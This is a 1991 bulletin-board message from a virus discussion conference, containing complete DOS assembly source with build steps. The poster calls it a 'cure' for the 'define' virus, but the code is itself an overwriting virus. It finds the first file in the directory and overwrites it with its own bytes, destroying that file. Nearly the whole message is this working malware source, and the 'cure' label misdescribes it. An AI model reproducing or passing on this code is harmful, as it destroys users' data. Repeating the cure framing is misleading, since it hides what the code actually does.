;===========================================================================
;Date: 05-24-91 (0:06)              Number: 6288            THE APEX BBS
;From: Mike Hathorn                 Refer#: NONE
;To: All                           Recvd: NO
;Subj: define                         Conf: (54) Virus
;---------------------------------------------------------------------------

;Gentlemen,


;The following assembly source code is the cure for the define
;virus. Define, because it is my belief that by the definition
;of a virus, no stable virus can be written smaller than define.

; Code compiled under MASM ver 4.00
; Use DOS EXE2BIN to convert to .COM file
; Code assumes SI=100h, AX=00h
; (c) 1991 Mithrandir


TITLE   DEFINE
CODE    SEGMENT


ASSUME  CS : CODE
ORG     100h


VIRUS_CURE:
XCHG    CX,AX                ;exchange register values and setup search
                             ;for normal files
MOV     AH,4Eh               ;setup search for first match
MOV     DX,OFFSET File       ;point to search criteria
INT     21h                  ;search for any normal file


MOV     AX,3D01h            ;setup open file with write access
MOV     DX,09Eh             ;point to file ASCIIZ spec
INT     21h                 ;open file
XCHG    BX,AX


MOV     AH,40h             ;setup write to file
MOV     DX,SI              ;write this code
MOV     CX,SI              ;this many bytes
INT     21h                ;write it


RET


File:
DB      '*.*',0


CODE ENDS


END VIRUS_CURE



;Mithrandir


;--- Opus-CBCS 1.14
 ;* Origin: The Mad Dog Opus (5:7104/3.0)
